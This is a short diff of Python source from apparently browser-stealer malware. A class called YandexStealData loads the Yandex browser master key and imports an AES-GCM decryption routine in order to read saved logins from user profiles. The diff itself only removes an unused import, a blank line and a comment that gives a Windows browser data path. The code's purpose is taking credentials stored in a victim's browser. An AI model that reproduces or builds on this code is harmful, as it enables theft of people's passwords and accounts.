@@ -1,12 +1,10 @@
 import sqlite3
 import os
 import hashlib
-import sys
 
 #------------------------------------------------------------------------------
 # sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from modules.Browsers.yandex.get_master_key_yandex import get_yandex_master_key, decrypt_aes_gcm
-
 from modules.Browsers._data_breeding_ import Login
 
 
@@ -22,8 +20,6 @@ class YandexStealData:
         
         self.master_key: bytes = get_yandex_master_key(local_state_file_path)
         if self.master_key and len(self.master_key) == 32:
-
-            # C:\Users\yoi\AppData\Local\Yandex\YandexBrowser\User Data\Default
 
             profiles: list[str] = [
                 'Default',
